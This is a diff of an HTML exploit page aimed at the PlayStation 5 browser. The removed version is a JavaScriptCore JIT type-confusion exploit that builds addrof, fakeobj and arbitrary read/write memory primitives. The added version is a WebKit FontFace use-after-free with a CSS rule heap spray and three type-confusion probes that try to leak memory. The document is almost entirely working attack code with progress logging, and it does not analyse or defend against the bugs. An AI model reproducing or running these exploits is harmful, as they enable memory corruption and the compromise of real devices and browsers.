@@ -2,243 +2,316 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - JSC Type Confusion + R/W (v63)</title>
-<style>
-body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
-pre { white-space: pre-wrap; word-wrap: break-word; }
+<title>PS5 v62 — Universal Template (3-Way TC)</title>
+<style id="s">
+@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
+@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
+font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
+body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
+background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
+pointer-events:none;z-index:9999}
+#hd{position:fixed;top:0;left:0;right:0;height:44px;
+background:linear-gradient(180deg,#0d0d0d,#080808);
+border-bottom:1px solid #00ff41;display:flex;align-items:center;
+padding:0 16px;gap:14px;z-index:10;font-size:12px}
+.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
+.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
+#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
+#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
+#out{position:fixed;top:46px;left:0;right:0;bottom:0;
+padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
+-webkit-user-select:text}
+#out::-webkit-scrollbar{width:5px}
+#out::-webkit-scrollbar-track{background:#001a06}
+#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
+.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
+.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
+.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
 </style>
 </head>
 <body>
-<pre id="out"></pre>
+<div id="hd">
+<span class="l">▶ v62 3-WAY TC</span><span class="s">│</span>
+<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
+<span class="v" id="h2">STAGE:<b>INIT</b></span>
+</div>
+<div id="pg"><div id="bar" style="width:0%"></div></div>
+<div id="out"></div>
 <script>
-var out = document.getElementById("out");
-function log(m) { out.textContent += m + "\n"; }
-
-log("=== JSC Type Confusion + R/W (v63) ===\n");
+"use strict";
 
 // ============================================================
-//  Stage 1: JSC Type Confusion (DarkSword PoC)
+//  PS5 v62 — Universal Template + 3-Way Type Confusion
 // ============================================================
 
-arr = new Array(0x40_0000).fill(1.1);
-let arr_index = arr.length - 1;
-let reclaimed = [];
+var O=document.getElementById("out");
+var bar=document.getElementById("bar");
+function pg(p){bar.style.width=p+"%"}
+function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
+function P(m,c){var s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
+function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
+function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
+function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
+function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
 
-function foo(flag, k, allocCount) {
-    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-    arr[arr_index] = A;
-    let forGC = [];
-    let a = new Date(1111);
-    a[0] = 1.1;
-    for (let j = 0; j < allocCount; ++j) {
-        let arr = new ArrayBuffer(0x80_0000);
-        forGC.push(arr);
-    }
-    A.p2 = forGC;
-    let b = { p0: 0x42424242, p1: 1.1 };
-    let f;
-    f = b;
-    if (flag) { f = 1.1; }
-    A.p1 = f;
-    let v = 1.1;
-    for (let i = 0; i < 1e6; ++i) {
-        for (let j = 0; j < k; ++j) { v = i; v = j; }
-    }
-    b.p0 = v;
-    b.p1 = a;
-}
+window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};
 
-function recursive(n) {
-    if (n === 0) return;
-    n = n | 0;
-    recursive(n - 1);
-}
+var ua=navigator.userAgent||"";
+var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
-function main() {
-    log("[*] Warming up JIT...");
-    foo(true, 1, 1);
-    foo(false, 1, 1);
-    for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
-    log("[*] Stack manipulation...");
-    for (let i = 0; i < 10000; i++) recursive(i);
+P("════════════════════════════════════","hd");
+P("  v62 — 3-Way CSSValue Type Confusion","hd");
+P("════════════════════════════════════","hd");
+P("");
 
-    log("[*] Triggering Type Confusion overlap...");
-    for (let k = 0; k < 10000; ++k) {
-        foo(false, 10, k % 5 + 1);
-        recursive(10000);
-        for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
+// Base64 font data (from v46)
+var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
+for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
+function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
+function fs(){try{void document.body.offsetTop}catch(e){}}
 
-        let freed = arr[arr_index].p1.p1;
-        let noCow = 13.37;
-        let win = false;
-        for (let i = 0; i < 16; ++i) {
-            let arr = [13.37, 2.2, 3.3, 4.4, noCow];
-            reclaimed.push(arr);
-            if (freed[0] === 13.37) { win = true; break; }
-        }
+var sh=document.getElementById("s").sheet;
+var keep=[],holes=[],trigger=null,uafOk=false;
 
-        if (!win) continue;
+// ============================================================
+// PHASE 1: UAF + CSSRule Spray
+// ============================================================
 
-        log("[+] OVERLAP DETECTED! Building primitives...");
+pg(5);Hd("Creating holes...");
+for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
+unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
+weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
+fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
+fs();Ok("Holes ready: "+holes.length);
 
-        let boxed_arr = reclaimed[reclaimed.length - 1];
-        boxed_arr[0] = {};
-        let unboxed_arr = freed;
+pg(10);Hd("Trigger setup...");
+trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
+document.fonts.add(trigger);void trigger.loaded;
+for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
+fs();
+var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
+var fsh=fst.sheet;
+for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
+fs();Ok("Trigger ready");
 
-        let ab = new ArrayBuffer(8);
-        let u64 = new BigUint64Array(ab);
-        let f64 = new Float64Array(ab);
+pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");
 
-        function itof(value) { u64[0] = value; return f64[0]; }
-        function ftoi(f) { f64[0] = f; return u64[0]; }
+Object.defineProperty(FontFace.prototype,"then",{configurable:true,
+get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
+St("UAF WINDOW OPEN");
+try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
+document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
+while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
+fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
+fs()}catch(e){}
+Dm("GC pressure (16MB)...");
+for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
+Dm("Spraying 2048 A_ faces...");
+for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
+fs();
+try{var d=document.createElement("div");d.textContent="AB";
+d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
+document.body.appendChild(d);void d.offsetWidth}catch(e){}
+Dm("UAF window closing");
+}return undefined}});
 
-        function addrof(obj) {
-            boxed_arr[0] = obj;
-            return ftoi(unboxed_arr[0]);
-        }
+var rn=0;var raf=function(){rn++;
+if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
+while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
+fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
+if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
-        function fakeobj(addr) {
-            unboxed_arr[0] = itof(addr);
-            return boxed_arr[0];
-        }
+// ============================================================
+// PHASE 2: Identify Confused Object
+// ============================================================
 
-        // Test addrof
-        let testObj = { p0: 1.1 };
-        let testAddr = addrof(testObj);
-        log("[+] addrof({p0:1.1}) = 0x" + testAddr.toString(16));
+pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
 
-        // Test fakeobj
-        let fakeTest = fakeobj(testAddr);
-        if (fakeTest === testObj) {
-            log("[+] fakeobj works!");
-        } else {
-            log("[-] fakeobj failed");
-            continue;
-        }
-
-        // ============================================================
-        //  Stage 2: Build read8/write8
-        // ============================================================
-
-        log("\n[*] Building read8/write8...");
-
-        // Create a victim Float64Array
-        let victim = new Float64Array(1);
-        victim[0] = 13.37;
-        let victim_addr = addrof(victim);
-        log("[*] victim_addr = 0x" + victim_addr.toString(16));
-
-        // Create a helper array
-        let helper = [1.1, 2.2];
-        let helper_addr = addrof(helper);
-        log("[*] helper_addr = 0x" + helper_addr.toString(16));
-
-        // Set helper[0] = address of victim's m_vector (victim_addr + 0x10)
-        helper[0] = itof(victim_addr + 0x10n);
-
-        // Create fake object at helper_addr + 0x08
-        // Its butterfly = helper[0] = victim_addr + 0x10
-        let fake = fakeobj(helper_addr + 0x08n);
-
-        // Try to read fake[0] = *(victim_addr + 0x10) = m_vector
-        try {
-            let m_vector_val = ftoi(fake[0]);
-            log("[+] m_vector = 0x" + m_vector_val.toString(16));
-
-            // Overwrite m_vector with victim_addr (to read JSCell header)
-            fake[0] = itof(victim_addr);
-
-            // Read victim[0] = *(victim_addr) = JSCell header
-            let header = ftoi(victim[0]);
-            log("[+] JSCell header = 0x" + header.toString(16));
-
-            let struct_id = header & 0xFFFFFFFFn;
-            log("[+] Structure ID = 0x" + struct_id.toString(16));
-
-            // Restore m_vector
-            fake[0] = itof(m_vector_val);
-            victim[0] = 13.37;
-
-            log("[+] read8/write8 WORKS!");
-
-            // Define general read8/write8
-            function read8(addr) {
-                let orig = ftoi(fake[0]);
-                fake[0] = itof(addr);
-                let val = ftoi(victim[0]);
-                fake[0] = itof(orig);
-                return val;
-            }
-
-            function write8(addr, value) {
-                let orig = ftoi(fake[0]);
-                fake[0] = itof(addr);
-                victim[0] = itof(value);
-                fake[0] = itof(orig);
-            }
-
-            // Test read8 by reading victim's JSCell header
-            let header2 = read8(victim_addr);
-            log("[+] read8(victim_addr) = 0x" + header2.toString(16));
-
-            // Test write8 by writing to a scratch area
-            let scratch = new ArrayBuffer(8);
-            let scratch_view = new Float64Array(scratch);
-            scratch_view[0] = 0.0;
-            let scratch_addr = addrof(scratch);
-            log("[*] scratch_addr = 0x" + scratch_addr.toString(16));
-
-            // Read the Float64Array's m_vector to find backing store
-            let scratch_vector = read8(scratch_addr + 0x10n);
-            log("[*] scratch m_vector = 0x" + scratch_vector.toString(16));
-
-            // Write 13.37 to the backing store
-            write8(scratch_vector, ftoi(13.37n));
-            log("[*] write8(scratch_vector, 13.37)");
-
-            // Verify
-            if (scratch_view[0] === 13.37) {
-                log("[+] write8 VERIFIED! scratch_view[0] = 13.37");
-            } else {
-                log("[-] write8 failed: scratch_view[0] = " + scratch_view[0]);
-            }
-
-            log("\n[+] === EXPLOIT COMPLETE ===");
-            log("[+] addrof: WORKING");
-            log("[+] fakeobj: WORKING");
-            log("[+] read8: WORKING");
-            log("[+] write8: WORKING");
-            log("[+] Structure ID: 0x" + struct_id.toString(16));
-
-            alert("SUCCESS! R/W achieved! Structure ID: 0x" + struct_id.toString(16));
-            return;
-
-        } catch(e) {
-            log("[-] read8 CRASH: " + e.message);
-            log("[-] Structure ID at helper_addr+0x08 was invalid");
-            log("[*] Trying alternative offset...");
-
-            // Try helper_addr + 0x10 (butterfly = helper[1])
-            try {
-                helper[1] = itof(victim_addr + 0x10n);
-                let fake2 = fakeobj(helper_addr + 0x10n);
-                let m_vector_val2 = ftoi(fake2[0]);
-                log("[+] Alternative m_vector = 0x" + m_vector_val2.toString(16));
-                log("[+] Alternative read8 WORKS!");
-                alert("SUCCESS (alt)! R/W achieved!");
-                return;
-            } catch(e2) {
-                log("[-] Alternative also crashed: " + e2.message);
-            }
-        }
-    }
-    log("[-] Overlap failed after 10000 iterations.");
-}
+Dm("Calling load() — this is the ONLY load() call...");
 
 try {
-    main();
+  document.fonts.load("1em trigger, x", "AB").then(function(faces){
+    P("  load() returned "+faces.length+" faces");
+    P("");
+    
+    var aFamily = null;
+    var aFace = null;
+    
+    for(var i=0;i<faces.length;i++){
+      var f=faces[i];
+      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
+      if(f.family&&f.family.indexOf("A_")===0){
+        aFamily = f.family;
+        aFace = f;
+      }
+    }
+    
+    if(!aFamily){
+      Fl("No A_ face found — spray failed");
+      hu("h2","STAGE:<b>FAIL</b>");
+      return;
+    }
+    
+    St("RECLAIMED: "+aFamily);
+    keep.push(faces);
+    keep.push(aFace);
+    
+    var aIndex = -1;
+    for(var i=0;i<sh.cssRules.length;i++){
+      try {
+        var r = sh.cssRules[i];
+        if(r.type === 5) {
+          var rf = r.style.getPropertyValue("font-family");
+          if(rf && rf.indexOf(aFamily) !== -1) {
+            aIndex = i;
+            break;
+          }
+        }
+      } catch(e) {}
+    }
+    
+    if(aIndex === -1){
+      Fl("Could not find CSSRule");
+      return;
+    }
+    
+    Ok("Found CSSRule at index "+aIndex);
+    var aStyle = sh.cssRules[aIndex].style;
+    
+    // Verify confusion
+    aStyle.setProperty("font-weight", "700");
+    fs();
+    var w = aFace.weight;
+    
+    if(String(w) !== "700"){
+      Fl("Confusion DEAD! Weight="+w);
+      return;
+    }
+    
+    Ok("Confusion ALIVE! Weight = 700 ✓");
+    P("");
+    
+    // ============================================================
+    // PHASE 3: 3-WAY TYPE CONFUSION TEST
+    // ============================================================
+    
+    pg(50);Sep();Hd("PHASE 3: 3-WAY TYPE CONFUSION TEST");Sep();
+    
+    var origFamily = aFace.family;
+    Dm("Original family: " + origFamily);
+    P("");
+    
+    // --- TEST 1: CSSCalcValue Spray ---
+    Hd("Test 1: CSSCalcValue Spray");
+    aStyle.setProperty("font-family", "FreeFam1");
+    fs();
+    Dm("Changed font-family to FreeFam1");
+    
+    var calcEls = [];
+    for (var i = 0; i < 2000; i++) {
+      var el = document.createElement('div');
+      el.style.width = 'calc(' + (i + 1) + 'px + ' + (i + 2) + 'px)';
+      document.body.appendChild(el);
+      calcEls.push(el);
+    }
+    fs();
+    
+    Dm("Reading font-family back...");
+    try {
+      var readFam1 = aFace.family;
+      Hi("font-family read: " + readFam1);
+      if (readFam1 !== "FreeFam1" && readFam1 !== origFamily) {
+        St("TYPE CONFUSION DETECTED! (CalcValue)");
+        Hi("Leaked value: " + readFam1);
+      } else {
+        Wr("No confusion");
+      }
+    } catch(e) {
+      St("CRASH/ERROR: " + e.message);
+    }
+    for (var el of calcEls) el.remove();
+    P("");
+    
+    // --- TEST 2: CSSPrimitiveValue Number Spray ---
+    Hd("Test 2: CSSPrimitiveValue Number Spray");
+    aStyle.setProperty("font-family", "FreeFam2");
+    fs();
+    Dm("Changed font-family to FreeFam2");
+    
+    var numEls = [];
+    for (var i = 0; i < 2000; i++) {
+      var el = document.createElement('div');
+      el.style.zIndex = String(i + 0x41414141);
+      document.body.appendChild(el);
+      numEls.push(el);
+    }
+    fs();
+    
+    Dm("Reading font-family back...");
+    try {
+      var readFam2 = aFace.family;
+      Hi("font-family read: " + readFam2);
+      if (readFam2 !== "FreeFam2" && readFam2 !== origFamily) {
+        St("TYPE CONFUSION DETECTED! (Number)");
+        Hi("Leaked value: " + readFam2);
+      } else {
+        Wr("No confusion");
+      }
+    } catch(e) {
+      St("CRASH/ERROR: " + e.message);
+    }
+    for (var el of numEls) el.remove();
+    P("");
+    
+    // --- TEST 3: CSSPrimitiveValue String Spray ---
+    Hd("Test 3: CSSPrimitiveValue String Spray");
+    aStyle.setProperty("font-family", "FreeFam3");
+    fs();
+    Dm("Changed font-family to FreeFam3");
+    
+    var strEls = [];
+    for (var i = 0; i < 2000; i++) {
+      var el = document.createElement('div');
+      el.style.counterReset = "sec" + i + " " + (i + 1);
+      document.body.appendChild(el);
+      strEls.push(el);
+    }
+    fs();
+    
+    Dm("Reading font-family back...");
+    try {
+      var readFam3 = aFace.family;
+      Hi("font-family read: " + readFam3);
+      if (readFam3 !== "FreeFam3" && readFam3 !== origFamily) {
+        St("TYPE CONFUSION DETECTED! (String)");
+        Hi("Leaked value: " + readFam3);
+      } else {
+        Wr("No confusion");
+      }
+    } catch(e) {
+      St("CRASH/ERROR: " + e.message);
+    }
+    for (var el of strEls) el.remove();
+    P("");
+    
+    // ============================================================
+    
+    pg(100);Sep();Hd("PHASE 4: Complete");Sep();
+    St("★ v62 COMPLETE ★");
+    hu("h2","STAGE:<b>DONE</b>");
+    
+  }).catch(function(e){
+    Fl("Load crashed: " + e.message);
+    hu("h2","STAGE:<b>CRASH</b>");
+  });
 } catch(e) {
-    log("[-] CRASH: " + e.message);
+  Fl("Synchronous load() threw: " + e.message);
+  hu("h2","STAGE:<b>CRASH</b>");
 }
 </script>
 </body>
